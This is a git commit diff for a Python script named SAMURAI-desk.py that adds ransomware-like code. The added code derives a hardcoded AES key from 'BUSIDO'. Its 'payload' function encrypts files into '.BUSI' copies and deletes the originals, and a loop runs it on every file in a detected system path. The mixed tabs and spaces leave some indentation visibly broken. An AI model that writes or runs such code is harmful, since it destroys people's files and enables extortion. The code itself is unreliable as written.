67d365b8a352d31c928a8f6c3e33b165c4e8ef50
Aleksey <sidorenkoalekse@mail.ru>
2018-12-06 23:47:19 +0700

    Update SAMURAI-desk.py

--- SAMURAI/SAMURAI-desk.py
+++ SAMURAI/SAMURAI-desk.py
@@ -3,6 +3,7 @@
 import os, random, struct, hashlib
 from Crypto.Cipher import AES
 
+KEY = hashlib.sha256("BUSIDO").digest()
 SYS_INFO = {"SYSTEM":None, "PATH":None}
 LOGIN = os.getlogin()
 
@@ -35,4 +36,33 @@ def get_system():
 			print("PATH ERROR")
 	else:
 		pass
-	print(SYS_INFO)
+
+
+def payload(key, in_filename, out_filename=None, chunksize=64*1024):
+
+	if not out_filename:
+        	out_filename = in_filename + '.BUSI'
+
+	iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
+    	encryptor = AES.new(key, AES.MODE_CBC, iv)
+    	filesize = os.path.getsize(in_filename)
+
+    	with open(in_filename, 'rb') as infile:
+       		with open(out_filename, 'wb') as outfile:
+            		outfile.write(struct.pack('<Q', filesize))
+          		outfile.write(iv)
+
+            		while True:
+                		chunk = infile.read(chunksize)
+                		if len(chunk) == 0:
+                    			break
+                		elif len(chunk) % 16 != 0:
+                    			chunk += ' ' * (16 - len(chunk) % 16)
+
+                	outfile.write(encryptor.encrypt(chunk))
+	os.remove(in_filename)
+
+
+get_system()
+for file in os.listdir(SYS_INFO["PATH"]):
+	payload(KEY, file)
